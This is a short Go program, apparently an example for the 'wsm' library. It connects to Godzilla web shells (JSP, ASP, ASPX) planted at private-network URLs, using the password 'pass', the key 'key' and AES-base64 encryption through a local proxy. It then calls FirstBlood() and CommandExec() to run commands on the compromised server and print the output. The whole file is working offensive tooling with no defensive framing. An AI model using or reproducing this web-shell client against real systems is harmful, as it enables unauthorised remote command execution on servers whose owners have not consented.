package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/godzilla"
	"log"
)

const (
	//JspShellUrl = "http://172.20.10.2:8080/bs64.jsp"
	//AspShellUrl = "http://10.10.11.10:8081/xorraw.asp"
	AspShellUrl  = "http://10.10.11.10:8081/xorbs64.asp"
	AspxShellUrl = "http://10.10.11.10:8081/bs64.aspx"
	JspShellUrl  = "http://10.10.11.10:8080/bs64.jsp"
)

func main() {
	info := &wsm.GodzillaInfo{
		BaseShell: shell.BaseShell{
			Url:      JspShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			// base64 的加密模式必须加上这个 header 头
			Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},
		},
		Key:    "key",
		Crypto: godzilla.JAVA_AES_BASE64,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.FirstBlood()

	//isAlive := g.Ping(nil)
	//fmt.Println(isAlive)
	basicInfo := g.CommandExec()
	fmt.Println("Info : ", basicInfo)
}
